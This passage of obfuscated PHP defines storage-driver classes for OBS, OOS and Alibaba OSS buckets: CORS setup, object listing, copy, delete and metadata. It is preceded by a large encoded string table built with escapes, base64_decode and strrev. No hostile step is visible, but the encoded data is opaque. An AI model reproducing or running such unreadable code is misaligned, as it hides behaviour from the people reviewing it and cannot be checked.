4\x65\x5d\xf0\xc9\x6a\x4e\x54\xc1\x1\x23\x93\x2e\x70\xfb\x31"."\221\320\256\13\325\1\51\205\115\250\64\366\340\71\171\157\23\272\313\37\322\52\367\270\42\366\230\352\174\17\114\74\263\46\126\123\347\263\123\374\150\336\22\223\301\262\35\17\235\45\314\204"."\326\357\241\62\32\346\163\42\326\64\46\207\345\173\7\244\27\50\223\251\367\322\174\274\227\112\0\354\301\322\264\207\274\237\111\131\235\373\245\56\151\246\161\216\52\227\356\317\230\111\55\3"."\306\215\216\333\204\5\264\277\322\331\252\340\0\243\111\176\55\237\27\207\31\362\42\212\376\165\134\370\206\274\256\104\233\112\234\237\250\324\266\40\56\150\116\72\112\244\211\160\254\130\314\205"."\351\241\212\43\265\40\355\374\144\257\323\364\240\105\334\33\6\160\324\316\116\172\206\12\10\223\253\144\347\332\134\111\216\70\13\337\40\373\113\317\301\261\101\30\160\24\154\200\243\13\273\20"."\342\211\104\336\232\1\200\262\104\21\244\341\230\310\230\224\220\174\114\137\50\45\234\102\26\345\77\47\125\172\105\16\136\102\55\367\50\34\245\174\362\323\254\367\361\155\16\216\213\345\136\166"."\340\44\314\144\334\217\224\226\76\270\312\36\127\145\123\7\136\126\55\363\134\352\224\257\255\172\304\25\361\317\173\153\116\134\144\316\243\241\160\76\244\313\205\5\276\223\50\331\214\270\367\41"."\x1c\xad\xae\x2\x31\x37\x92\x13\x66\xa9\xc6\x58\x58\xa\x38\xde\x82\x95\x7a\xd\xac\xad\xf4\x3d\x59\x9\xd\x52\xbf\x8b\x85\x8c\x87\x18\x4d\x78\x98\x6d\x62\xd9\x27\x69\x1d\x2f\xdf\xb9\x7\xb4\xcc\xa3\xb6\x5f"."\x58\x21\x5c\xe8\x20\xdb\xb0\xb4\x93\xeb\xd5\x2f\x49\x16\xd8\x99\xb3\x1b\xcc\x70\xd0\xae\x5a\xd0\xc5\x25\x47\xea\x6c\xba\x64\x81\x58\x9d\x4d\xd7\xcd\x99\xb7\x48\x56\x77\x88\x21\x14\x27\xb1\xe0\xf0\x5\xe\x94"."\101\132\21\104\241\70\320\340\121\230\207\153\171\366\223\114\347\15\241\322\327\220\135\53\300\377\154\302\210\375\4\5\225\354\147\113\337\215\57\301\0\241\123\311\212\113\132\20\135\346\71\46".base64_decode('tpixxKyjS6B49dj5LSo+lOmH+Kw0WegLtmYG77qzWJtvFzTnFrPcTopggm3bsEJWxJwGTA==')."\240\137\21\331\322\126\113\256\321\66\335\312\41\134\34\257\213\104\321\31\315\145\140\331\306\376\63\304\154\223\70\321\377\140\0\331\256\211\156\260\204\345\26\356\276\143\263\355\304\202\177\31"."\143\63\145\136\53\226\354\132\76\247\17\124\322\343\273\105\257\146\173\45\342\224\224\213\272\35\45\203\15\354\102\154\152\235\375\166\125\217\212\211\72\172\75\312\124\100\245\342\236\364\250\261"."\360\331\50\11\172\270\64\273\65\77\205\116\200\134\332\166\212\114\362\143\254\344\342\263\160\56\104\246\256\143\32\113\16\345\345\213\303\244\42\171\176\224\126\55\75\155\53\164\106\104\311\4"."\75\202\311\115\314\37\110\63\3\255\374\276\271\46\231\341\71\25\131\40\334\111\217\261\43\364\111\57\224\233\162\130\214\11\136\23\242\354\166\7\152\216\143\147\212\342\315\256\267\354\11\377".strrev('¬ÅB—êeéi5ú@mÉ8Àèc÷QGŞû((‘\'îYØéö¿‡¦Ç’‡à†˜FpÏp?r').base64_decode('iEjqYLLf4pkOdw/YM6GLRzAnEpbrwW/qCZ2G2bbg//q12/9Xj9zO4w/n4Pr51b5WEM6htQ==')."\370\164\224\253\57\250\322\330\325\17\347\362\72\15\250\10\41\337\67\54\230\12\211\163\343\156\346\235\222\71\255\324\330\341\231\226\311\110\213\160\371\355\114\311\113\343\210\370\6\371\263\325"."\345\42\356\73\317\356\127\307\273\211\316\226\75\50\336\133\16\120\360\45\276\153\52\103\307\64\211\11\313\202\47\345\214\324\140\231\223\157\142\314\352\174\271\100\22\116\112\300\104\33\220\14"."\303\334\176\372\131\50\205\267\213\304\65\16\140\117\366\142\20\315\263\215\145\65\254\2\275\360\13\56\123\200\151\311\214\312\221\124\302\336\22\216\61\161\44\312\350\26\74\310\307\206\323\121"."\xa2\xdd\xf5\xba\x32\x5\x62\x5e\x8d\xc1\xb0\x41\xe2\xa7\xa5\x86\x10\xa5\xa5\x39\x1f\x90\x8b\x60\x9b\x7a\xa7\xb6\xb\xf\x30\x6e\x98\xb7\xc6\xeb\x4a\xa8\xf5\xba\xaa\xe3\xf\x4c\x3b\x69\xdd\xf1\xe2\x31\x35\x1e"."\101\23\44\206\125\40\114\251\105\316\213\310\301\261\267\264\14\245\353\270\200\231\142\146\225\237\337\274\121\102\303\207\103\62\76\30\237\350\54\230\104\120\164\246\162\265\220\144\326\234\222\324".base64_decode('qG7ZjybP8MkdkU9Unccy2NpOnFMmorGQujKMPW6ETwt1MWfPhkleRmFVdrVXkXt1MAHQLg==').base64_decode('psUUpKQjZibpdIXHYmzcTRSXE5LAwG5zS9cXmMcwWb3oBMZ3UJyzcWk5sJRZsGSHn45MLA==')."\x78\x99\x28\x37\xc6\x76\xd2\x5d\x39\x34\x95\xf5\x94\xad\xa7\x15\xbc\x84\x3b\xa4\xfa\xee\xb9\x35\x73\x7a\x3f\xaf\x96\xb9\xec\xe9\x3e\x4\x39\xf7\xb\x20\x61\x7b\x11\x9f\xe3\x65\xa6\xb9\xc\xa6\x6c\x39\x93\x7a".base64_decode('BiqXh6gzbjvISDy4435op8XhdateUncq5E0ieHFpirHpMINCuHDlYeYwdS7en/LDY/YOCw==')."\x36\x7b\xf3\x63\xf7\x64\xf8\x16\x85\x9f\x50\x20\xf3\xc0\xa1\x66\x55\x66\x5\x84\xb5\x2\x42\xb7\x43\x78\x6e\xe9\xae\x10\xbe\x64\x17\xc6\xa2\x85\x58\x96\x5f\x9e\x20\xfa\x1c\xaa\xa2\x71\x68\x6a\xe0\xb0\x5f\x4e"."\x92\xe\xbf\xd1\x76\x2b\xed\x7c\x99\x8c\x64\x92\x64\xe6\x57\x1c\x6a\x90\x8e\x6f\x9d\xa7\xe7\xfc\xce\x6d\xc9\xa\x58\x34\x22\x52\x36\x29\xc5\xfc\xd3\xa2\x5f\xec\x6c\x20\x2c\x9c\x43\x91\x6c\x7a\x30\x15\x18\xd6"."\270\377\65\167\251\56\307\126\126\72\153\117\21\36\21\52\75\116\25\247\274\222\374\310\212\341\275\260\130\332\135\351\22\117\25\253\236\66\54\244\141\261\33\113\247\133\264\341\62\240\151\266"."\37\345\251\50\205\203\22\151\132\362\26\42\156\264\350\43\362\327\1\116\134\70\161\0\226\246\12\157\42\122\171\161\260\46\272\211\323\312\165\237\360\70\147\161\331\133\11\47\52\221\104\237"."\232\342\206\51\322\316\27\133\356\10\213\25\332\25\256\340\21\237\164\372\106\341\140\174\314\20\14\271\376\346\165\244\272\366\362\130\227\306\44\101\127\26\150\227\244\352\313\52\241\44\22\320".base64_decode('MxGpOvl4fcoC8fIfEVTpRLHkVEZkMKFFrsWxavGOAWRMznQ0xz20ZOspyJcmZokin+YFnA==')."\131\24\136\167\265\136\56\340\356\31\55\41\57\45\216\364\21\303\116\15\110\373\344\322\314\322\364\102\11\262\241\1\345\373\341\156\55\303\265\133\173\40\52\51\151\217\144\273\223\60\313\224".strrev('¥À²Ï…N#gBÃ¦]*6äR½ÑMh­lå%x%Â³d–Ë…šYp'."\n".';(â{b’áfŒ[*-¡')."\x9f\x3\x4a\x74\x43\x13\xf5\x55\xf9\x56\x8\xad\x93\xcb\x86\xa2\x5c\x2b\xca\x2\x4f\xd9\xa\x37\xb4\x90\x39\xf0\x1e\xb4\x5c\x8e\xc3\xe4\xc8\xb9\xa2\x94\xe3\xdb\x2c\xa7\xc\xa7\xa6\x5c\x68\x4a\x5b\x24\x61\x9f"."\x53\xba\x64\x88\xbc\x32\xd6\x42\xf4\x93\x58\xfa\x91\x1d\x55\x96\xc9\x96\x4d\x8f\xca\x1b\x27\xc5\xca\x72\x19\xcb\x69\x35\xe4\x4a\x97\x11\x4\x2e\xd1\x69\x84\x59\x17\x22\x11\x2c\x63\xc\xa\xab\x4c\x76\x29\x3".strrev('İ)i³]Ñ®O-~4dÂU*¬";Ù}9ÉEsô“›R\\ñ¸(ä±nŒ-)åòg0qÄÜô')."\351\1\137\366\127\111\363\331\107\62\222\42\332\245\3\26\212\52\207\125\113\31\315\50\111\242\101\237\70\216\241\365\211\276\110\64\341\270\302\105\105\22\70\305\242\7\340\101\154\150\301\217"."\x3e\x89\x1b\x76\xba\x84\xd3\xec\xb8\x59\xb0\x3d\x38\x2f\x61\xe6\xc9\x6f\x93\x69\xdb\xc2\x44\x84\x6a\x86\x88\x98\x8d\xd7\x61\x8f\x64\x1\x85\x42\xe2\x9c\x13\x37\x8a\x1c\xa0\x11\xb2\x25\x1c\x8b\x4\xe1\x28\x1e"."\253\134\342\72\315\45\174\316\21\301\7\163\74\42\57\263\160\44\337\122\164\31\15\210\204\101\63\235\64\107\231\223\110\354\250\103\264\107\34\335\151\156\331\122\210\105\100\212\262\75\27\161".strrev('k2¾<@Î¬’ñÅ˜®.ˆV·ĞU¾ '."\r".'^]Û’¯}8£¿|ÚßUÕà:’ò[iùb‡')."\246\117\263\224\144\223\122\222\175\134\111\126\147\133\264\143\252\274\120\173\40\34\51\311\303\246\164\35\252\160\67\112\263\302\235\244\225\344\364\171\252\126\204\203\313\105\113\210\235\203\70\25"."\xca\xf\x98\xec\xb0\x87\x9d\x9a\xc5\xb5\xc\x53\xf3\x48\xa7\x6\x7a\x56\xf8\x99\x15\x65\x9c\xda\x2b\x79\x5c\x2d\xe6\x10\x9a\x7\x9c\xef\x1c\xba\x2c\x56\x19\xc1\x42\x45\xd8\xc\xae\x3\xea\x8e\xe5\x21\x15\x3f".strrev('÷tX\'JLÖ²4“1NÃprEÂzPŠ|E•fN:òsD˜A¹“¥!àaÏ†á…ß—=çÃU')."\4\227\274\1\245\222\251\43\15\73\262\155\255\277\254\235\3\125\16\343\331\57\324\266\377\33\167\160\305\350\205\267\0\0"."".""."".""."", 10, -8))); goto aËáˆ›°ë·; CÊÆ´§»Å¶: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Şçğ²÷Ä) { parent::__construct($Şçğ²÷Ä); $this->setSignVersion($_SERVER[Ñ¯©ç][248]); } public function fileOutImage($õ®Ì‹Â , $ÙÃ»´Œ½ = 250) { $Éù†‰òë =& $_SERVER[Ñ¯©ç]; if ($this->size($õ®Ì‹Â ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($õ®Ì‹Â , $ÙÃ»´Œ½); } $‡î÷ï±„ = array($Éù†‰òë[1431] => $Éù†‰òë[1432] . $ÙÃ»´Œ½ . $Éù†‰òë[1433]); $àº¦ÅÊÜ = $this->link($õ®Ì‹Â , $‡î÷ï±„); $this->fileOutLink($àº¦ÅÊÜ); } public function fileOutLink($˜İªì´”) { $¾äÎÅÖÇ =& $_SERVER[Ñ¯©ç]; if (substr($˜İªì´”, 0, 7) == $¾äÎÅÖÇ[1381]) { $˜İªì´” = $¾äÎÅÖÇ[1382] . substr($˜İªì´”, 7); } header($¾äÎÅÖÇ[175] . $˜İªì´”); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ñÅ²Û¾›) { parent::__construct($ñÅ²Û¾›); $this->setSignVersion($_SERVER[Ñ¯©ç][248]); } public function fileOutLink($éîßÓÅˆ) { $éĞéê° =& $_SERVER[Ñ¯©ç]; if (substr($éîßÓÅˆ, 0, 7) == $éĞéê°[1381]) { $éîßÓÅˆ = $éĞéê°[1382] . substr($éîßÓÅˆ, 7); } header($éĞéê°[175] . $éîßÓÅˆ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($§¬·™¬®) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ñ¯©ç][1434]; $this->_init($§¬·™¬®); } public function _init($›²Íşù) { $ÖÄçÔÈŞ =& $_SERVER[Ñ¯©ç]; $this->config = $›²Íşù; foreach ($›²Íşù as $ãùç©¼ => $Ô‡€ü‚) { if (isset($this->{$ãùç©¼})) { $this->{$ãùç©¼} = $Ô‡€ü‚; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÖÄçÔÈŞ[1435] . LNG($ÖÄçÔÈŞ[1436])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¬ÜşñÇÉ =& $_SERVER[Ñ¯©ç]; $ÊáÓ¡šˆ = new OSS\Model\CorsConfig(); $Ó—ÒÊÚ° = new OSS\Model\CorsRule(); $Ó—ÒÊÚ°->addAllowedOrigin($¬ÜşñÇÉ[1437]); $Ó—ÒÊÚ°->addAllowedMethod($¬ÜşñÇÉ[1438]); $Ó—ÒÊÚ°->addAllowedMethod($¬ÜşñÇÉ[1439]); $Ó—ÒÊÚ°->addAllowedMethod($¬ÜşñÇÉ[1440]); $Ó—ÒÊÚ°->addAllowedMethod($¬ÜşñÇÉ[1441]); $Ó—ÒÊÚ°->addAllowedMethod($¬ÜşñÇÉ[174]); $Ó—ÒÊÚ°->setMaxAgeSeconds(600); $Ó—ÒÊÚ°->addExposeHeader($¬ÜşñÇÉ[1442]); $Ó—ÒÊÚ°->addAllowedHeader($¬ÜşñÇÉ[1437]); $ÊáÓ¡šˆ->addRule($Ó—ÒÊÚ°); try { $this->client->putBucketCors($this->bucket, $ÊáÓ¡šˆ); } catch (OSS\Core\OssException $¨²Äì’¥) { $this->writeLog(__FUNCTION__ . $¬ÜşñÇÉ[215] . $¨²Äì’¥->getMessage()); return !1; } return !0; } public function getBucketCors() { $µƒ…©ï³ =& $_SERVER[Ñ¯©ç]; $—ŞÂ´ë = null; try { $—ŞÂ´ë = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $»÷ï¡Ïã) { $this->writeLog(__FUNCTION__ . $µƒ…©ï³[215] . $»÷ï¡Ïã->getMessage()); return null; } if (!$—ŞÂ´ë || !($§¹´”” = $—ŞÂ´ë->getRules())) { return null; } $á£ü™¼ = $§¹´””[0]->getAllowedOrigins(); $ÁÙ©Ú±× = $§¹´””[0]->getAllowedMethods(); $à›¤†é = $§¹´””[0]->getMaxAgeSeconds(); $áÆÂ·İ— = $§¹´””[0]->getExposeHeaders(); $—¸¹“† = $§¹´””[0]->getAllowedHeaders(); return array($µƒ…©ï³[219] => isset($á£ü™¼[0]) ? $á£ü™¼[0] : $µƒ…©ï³[12], $µƒ…©ï³[223] => $ÁÙ©Ú±×, $µƒ…©ï³[1443] => $à›¤†é, $µƒ…©ï³[1444] => isset($áÆÂ·İ—[0]) ? $áÆÂ·İ—[0] : $µƒ…©ï³[12], $µƒ…©ï³[220] => isset($—¸¹“†[0]) ? $—¸¹“†[0] : $µƒ…©ï³[12]); } public function isBucketCors() { $â¸îİ† =& $_SERVER[Ñ¯©ç]; $ë·­â²² = $this->getBucketCors(); if (!$ë·­â²² || !is_array($ë·­â²²)) { return !1; } if ($ë·­â²²[$â¸îİ†[219]] != $â¸îİ†[221] || $ë·­â²²[$â¸îİ†[220]] != $â¸îİ†[221]) { return !1; } $»óßå“÷ = array_map($â¸îİ†[222], $ë·­â²²[$â¸îİ†[223]]); if (!is_array($»óßå“÷)) { $»óßå“÷ = array(); } $òÚÃşÎ = array($â¸îİ†[224], $â¸îİ†[225], $â¸îİ†[226], $â¸îİ†[227], $â¸îİ†[228]); $Í·ÚÙ‚î = array_diff($òÚÃşÎ, $»óßå“÷); return empty($Í·ÚÙ‚î); } public function mkfile($¬“‚‚, $ÅÂÜàÈ = '', $‰Ï×¡Íõ = REPEAT_RENAME) { $ãùØ…©Ò = $this->setContent($¬“‚‚, $ÅÂÜàÈ); if ($ãùØ…©Ò !== !1) { return $this->getPathOuter($¬“‚‚); } return !1; } public function mkdir($˜ÃâÎ–Ã, $è·ÉÙ× = REPEAT_SKIP) { if ($è·ÉÙ× && $this->_isFolder($˜ÃâÎ–Ã)) { return $this->getPathOuter($˜ÃâÎ–Ã); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($˜ÃâÎ–Ã)); } catch (OSS\Core\OssException $»¸á¸³) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][215] . $»¸á¸³->getMessage()); return !1; } return $this->getPathOuter($˜ÃâÎ–Ã); } private function fileList($‚¦üÁÑ, $š€Á¾Êº = '', $˜‚øğàÃ = 0) { $ÚÌğ‰À± =& $_SERVER[Ñ¯©ç]; $‚¦üÁÑ = trim($‚¦üÁÑ, $ÚÌğ‰À±[8]); $ãòÀö× = empty($‚¦üÁÑ) && $‚¦üÁÑ !== $ÚÌğ‰À±[229] ? $ÚÌğ‰À±[12] : $‚¦üÁÑ . $ÚÌğ‰À±[8]; $´×˜Ÿ¸ = $ÚÌğ‰À±[12]; $Ùéç×áƒ = 1000; $ªÌã™†ş = $Šò´É‰¹ = array(); while (!0) { check_abort(); $°Áô™› = array($ÚÌğ‰À±[1445] => $š€Á¾Êº, $ÚÌğ‰À±[1446] => $ãòÀö×, $ÚÌğ‰À±[1447] => $Ùéç×áƒ, $ÚÌğ‰À±[1448] => $´×˜Ÿ¸); try { $¾Ù¿í’ = $this->client->listObjects($this->bucket, $°Áô™›); } catch (OSS\Core\OssException $ıÒ”‡Ø£) { $this->writeLog(__FUNCTION__ . $ÚÌğ‰À±[215] . $ıÒ”‡Ø£->getMessage()); break; } $´×˜Ÿ¸ = $¾Ù¿í’->getNextMarker(); $–²àÔ³ä = $¾Ù¿í’->getObjectList(); $ÚØîÆ° = $¾Ù¿í’->getPrefixList(); foreach ($–²àÔ³ä as $†¼ë„Ú) { if ($†¼ë„Ú->getKey() == $ãòÀö×) { continue; } $ôñ§‰”€ = $†¼ë„Ú->getKey(); $àÃ›çò = $†¼ë„Ú->getSize(); $¹”ì‡ó¬ = $†¼ë„Ú->getLastModified(); $¹«’ğ®¦ = trim($†¼ë„Ú->getETag(), $ÚÌğ‰À±[131]); $ÎÈ¤³¼Ñ = $˜‚øğàÃ ? array($ÚÌğ‰À±[32] => $ôñ§‰”€, $ÚÌğ‰À±[89] => $àÃ›çò, $ÚÌğ‰À±[207] => strtotime($¹”ì‡ó¬), $ÚÌğ‰À±[1449] => $¹«’ğ®¦) : $ôñ§‰”€; $‚õöîæÀ = $àÃ›çò == 0 && substr($ôñ§‰”€, strlen($ôñ§‰”€) - 1, 1) == $ÚÌğ‰À±[8] ? !0 : !1; $ôÄÅå— = array($ÚÌğ‰À±[89] => $àÃ›çò, $ÚÌğ‰À±[1450] => $àÃ›çò, $ÚÌğ‰À±[98] => strtotime($¹”ì‡ó¬), $ÚÌğ‰À±[1451] => $¹”ì‡ó¬, $ÚÌğ‰À±[1449] => $¹«’ğ®¦); $this->cacheMethodInfoSet($ôñ§‰”€, $‚õöîæÀ, $ôÄÅå—); if ($‚õöîæÀ) { $ªÌã™†ş[] = $ôñ§‰”€; continue; } $Šò´É‰¹[] = $ÎÈ¤³¼Ñ; } foreach ($ÚØîÆ° as $Ü©øÕã¯) { $ªÌã™†ş[] = $Ü©øÕã¯->getPrefix(); $this->cacheMethodInfoSet($Ü©øÕã¯->getPrefix(), !0); } if ($´×˜Ÿ¸ === $ÚÌğ‰À±[12]) { break; } } $this->cacheMethodInfoSet($‚¦üÁÑ, !0); return array($ÚÌğ‰À±[95] => $ªÌã™†ş, $ÚÌğ‰À±[96] => $Šò´É‰¹); } public function listObject($µç’Õ–‚, $“í—ßáÙ = '') { $ı¹ùğÔù =& $_SERVER[Ñ¯©ç]; $µç’Õ–‚ = trim($µç’Õ–‚, $ı¹ùğÔù[8]); $üµıİªÈ = empty($µç’Õ–‚) && $µç’Õ–‚ !== $ı¹ùğÔù[229] ? $ı¹ùğÔù[12] : $µç’Õ–‚ . $ı¹ùğÔù[8]; $‰ÊÖ™Ô— = $ı¹ùğÔù[12]; $Ø–®Èî¤ = 1000; $Äğ™øØâ = $îòòšÂ‚ = array(); while (!0) { check_abort(); $‘šñÆòæ = array($ı¹ùğÔù[1445] => $“í—ßáÙ, $ı¹ùğÔù[1446] => $üµıİªÈ, $ı¹ùğÔù[1447] => $Ø–®Èî¤, $ı¹ùğÔù[1448] => $‰ÊÖ™Ô—); try { $öªº¶ŠŠ = $this->client->listObjects($this->bucket, $‘šñÆòæ); } catch (OSS\Core\OssException $ßÔ›…¼ü) { $this->writeLog(__FUNCTION__ . $ı¹ùğÔù[215] . $ßÔ›…¼ü->getMessage()); break; } $‰ÊÖ™Ô— = $öªº¶ŠŠ->getNextMarker(); $êˆé§ı½ = $öªº¶ŠŠ->getObjectList(); foreach ($êˆé§ı½ as $Œë£ñéú) { if ($Œë£ñéú->getKey() == $üµıİªÈ) { continue; } $ìƒ©ĞÈ± = $Œë£ñéú->getKey(); $Ø„ò£©Ç = $Œë£ñéú->getSize(); $¸ãŠöî¨ = $Ø„ò£©Ç == 0 && substr($ìƒ©ĞÈ±, strlen($ìƒ©ĞÈ±) - 1, 1) == $ı¹ùğÔù[8] ? !0 : !1; if ($¸ãŠöî¨) { continue; } (yield $Ø„ò£©Ç . $ı¹ùğÔù[215] . $ìƒ©ĞÈ±); } if ($‰ÊÖ™Ô— === $ı¹ùğÔù[12]) { break; } } } public function copyFile($Î·ÚÇ¾, $‡Êà ÍÈ) { $ÉÆ…Ë¨ù = $this->size($Î·ÚÇ¾); if ($ÉÆ…Ë¨ù < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Î·ÚÇ¾, $this->bucket, $this->pathEncode($‡Êà ÍÈ)); } catch (OSS\Core\OssException $«ôãß§Ç) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][215] . $«ôãß§Ç->getMessage()); return !1; } return $this->getPathOuter($‡Êà ÍÈ); } $Õ£Ñé¬Ø = $this->multiCopyObject($Î·ÚÇ¾, $‡Êà ÍÈ, $ÉÆ…Ë¨ù); return $Õ£Ñé¬Ø ? $this->getPathOuter($‡Êà ÍÈ) : !1; } private function multiCopyObject($Ó¶Åæ®, $ıÑÇíî, $»çîë³á) { $œ¦½…´ó =& $_SERVER[Ñ¯©ç]; try { $ğ¦ûíëÇ = array(); if ($£”ŸéíÍ = $this->hashMd5($Ó¶Åæ®)) { $ğ¦ûíëÇ = array(OSS\OssClient::OSS_HEADERS => array($œ¦½…´ó[1452] => $£”ŸéíÍ)); } $îœáïùÆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ıÑÇíî), $ğ¦ûíëÇ); $ÑŸ¿·È¤ = 1; $ÓĞÊãòÁ = 0; $„ÅÒşœ = array(); $®‘î·… = 1024 * 1024 * 10; $‰‡…Ø¯³ = $this->client->generateMultiuploadParts($»çîë³á, $®‘î·…); foreach ($‰‡…Ø¯³ as $ù§ŒÆ® => $Ô’İÄïŒ) { $‡İ‹ ÍÈ = $ÓĞÊãòÁ + (int) $Ô’İÄïŒ[$œ¦½…´ó[1453]]; $Ò‰ö¥Şî = (int) $Ô’İÄïŒ[$œ¦½…´ó[397]] + $‡İ‹ ÍÈ - 1; $µüˆ€ø¤ = array($œ¦½…´ó[1454] => $‡İ‹ ÍÈ, $œ¦½…´ó[1455] => $Ò‰ö¥Şî); $„ÅÒşœ[] = $this->client->uploadPartCopy($this->bucket, $Ó¶Åæ®, $this->bucket, $this->pathEncode($ıÑÇíî), $ÑŸ¿·È¤, $îœáïùÆ, $µüˆ€ø¤); $ÑŸ¿·È¤ = $ÑŸ¿·È¤ + 1; } $çáÍöçç = array(); foreach ($„ÅÒşœ as $ù§ŒÆ® => $¿¹¢Ú£¼) { $çáÍöçç[] = array($œ¦½…´ó[1456] => $ù§ŒÆ® + 1, $œ¦½…´ó[1457] => $¿¹¢Ú£¼); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ıÑÇíî), $îœáïùÆ, $çáÍöçç); } catch (OSS\Core\OssException $µõñ¼š˜) { $this->writeLog(__FUNCTION__ . $œ¦½…´ó[215] . $µõñ¼š˜->getMessage()); return !1; } return !0; } public function moveFile($ƒ ÁšØá, $®æõëÂ) { if ($this->copyFile($ƒ ÁšØá, $®æõëÂ)) { $this->remove($ƒ ÁšØá); return $this->getPathOuter($®æõëÂ); } return !1; } public function delFile($Ü¯ÕƒÓ ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ü¯ÕƒÓ )); } catch (OSS\Core\OssException $Ú†ë¦‰¦) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][215] . $Ú†ë¦‰¦->getMessage()); return !1; } return !0; } public function delFolder($É×íãô´) { $°’Òê«ì =& $_SERVER[Ñ¯©ç]; if (!$this->exist($É×íãô´)) { return !0; } $this->listItemCache = !1; $àÔÜÙ‡Š = $this->fileList($É×íãô´); $this->listItemCache = !0; $Ğ‡ ÎÃ = trim($É×íãô´, $°’Òê«ì[8]) . $°’Òê«ì[8]; if (!empty($É×íãô´) && $É×íãô´ !== $°’Òê«ì[229] && !in_array($Ğ‡ ÎÃ, $àÔÜÙ‡Š[$°’Òê«ì[95]])) { $àÔÜÙ‡Š[$°’Òê«ì[95]][] = $Ğ‡ ÎÃ; } $ıÃ¼…±² = $this->delByBatch($àÔÜÙ‡Š[$°’Òê«ì[96]]); if (!$ıÃ¼…±²) { return !1; } $ıÃ¼…±² = $this->delByBatch($àÔÜÙ‡Š[$°’Òê«ì[95]]); if (!$ıÃ¼…±²) { return !1; } return $this->delFile($Ğ‡ ÎÃ); } private function delByBatch($Úß¶—ÏÕ) { foreach (array_chunk($Úß¶—ÏÕ, 1000) as $¤Š›²) { try { $this->client->deleteObjects($this->bucket, $¤Š›²); } catch (OSS\Core\OssException $’¥Ù‰Ó•) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][215] . $’¥Ù‰Ó•->getMessage()); return !1; } } return !0; } public function rename($Œ¸¦‰ûÅ, $›Ä›…ùì) { return $this->renameObject($Œ¸¦‰ûÅ, $›Ä›…ùì); } private function fileInfo($†²ì´ÆÚ, $€Æˆùü— = false, $ÌÂìÔı = array()) { $ºìıÌ• =& $_SERVER[Ñ¯©ç]; $«óÌ™Ê“ = array($ºìıÌ•[32] => $this->pathThis($†²ì´ÆÚ), $ºìıÌ•[97] => $this->getPathOuter($†²ì´ÆÚ), $ºìıÌ•[33] => $ºìıÌ•[231], $ºìıÌ•[89] => isset($ÌÂìÔı[$ºìıÌ•[89]]) ? $ÌÂìÔı[$ºìıÌ•[89]] : 0, $ºìıÌ•[188] => $this->ext($†²ì´ÆÚ)); if ($€Æˆùü—) { return $«óÌ™Ê“; } $«óÌ™Ê“[$ºìıÌ•[232]] = $«óÌ™Ê“[$ºìıÌ•[98]] = 0; $«óÌ™Ê“[$ºìıÌ•[233]] = $«óÌ™Ê“[$ºìıÌ•[234]] = !0; if (empty($ÌÂìÔı)) { $ØãàîÜÅ = $this->objectMeta($†²ì´ÆÚ); if (!$ØãàîÜÅ) { return $«óÌ™Ê“; } $ÌÂìÔı = array($ºìıÌ•[98] => strtotime($ØãàîÜÅ[$ºìıÌ•[1451]]), $ºìıÌ•[89] => $ØãàîÜÅ[$ºìıÌ•[1450]] + 0, $ºìıÌ•[1449] => $ØãàîÜÅ[$ºìıÌ•[1449]]); } if (isset($ÌÂìÔı[$ºìıÌ•[1449]]) && $ÌÂìÔı[$ºìıÌ•[1449]]) { $«óÌ™Ê“[$ºìıÌ•[236]] = trim($ÌÂìÔı[$ºìıÌ•[1449]], $ºìıÌ•[131]); } if (isset($ÌÂìÔı[$ºìıÌ•[89]])) { $«óÌ™Ê“[$ºìıÌ•[89]] = $ÌÂìÔı[$ºìıÌ•[89]]; } if (isset($ÌÂìÔı[$ºìıÌ•[98]])) { $«óÌ™Ê“[$ºìıÌ•[98]] = $ÌÂìÔı[$ºìıÌ•[98]]; } if (isset($ÌÂìÔı[$ºìıÌ•[207]]) && !trim($«óÌ™Ê“[$ºìıÌ•[98]])) { $«óÌ™Ê“[$ºìıÌ•[98]] = $ÌÂìÔı[$ºìıÌ•[207]]; } return $«óÌ™Ê“; } private function folderInfo($¡²™­é, $æ¿•ÙĞ = false, $«Ş‡¥¬¤ = array()) { $àÎğò¥ =& $_SERVER[Ñ¯©ç]; $ó„¦‘×É = array($àÎğò¥[32] => $this->pathThis($¡²™­é), $àÎğò¥[97] => $this->getPathOuter($àÎğò¥[8] . $¡²™­é), $àÎğò¥[33] => $àÎğò¥[88]); if ($æ¿•ÙĞ) { return $ó„¦‘×É; } $ó„¦‘×É[$àÎğò¥[232]] = $ó„¦‘×É[$àÎğò¥[98]] = 0; $ó„¦‘×É[$àÎğò¥[233]] = $ó„¦‘×É[$àÎğò¥[234]] = !0; if (empty($«Ş‡¥¬¤)) { $¡²™­é = rtrim($¡²™­é, $àÎğò¥[8]) . $àÎğò¥[8]; $‚ıà¾¥ = $this->objectMeta($¡²™­é); if (!$‚ıà¾¥) { return $ó„¦‘×É; } $«Ş‡¥¬¤ = array($àÎğò¥[232] => $‚ıà¾¥[$àÎğò¥[559]][$àÎğò¥[1458]], $àÎğò¥[98] => strtotime($‚ıà¾¥[$àÎğò¥[1451]])); } if (isset($«Ş‡¥¬¤[$àÎğò¥[98]])) { $ó„¦‘×É[$àÎğò¥[98]] = $«Ş‡¥¬¤[$àÎğò¥[98]]; } if (isset($«Ş‡¥¬¤[$àÎğò¥[232]])) { $ó„¦‘×É[$àÎğò¥[232]] = $«Ş‡¥¬¤[$àÎğò¥[232]]; } return 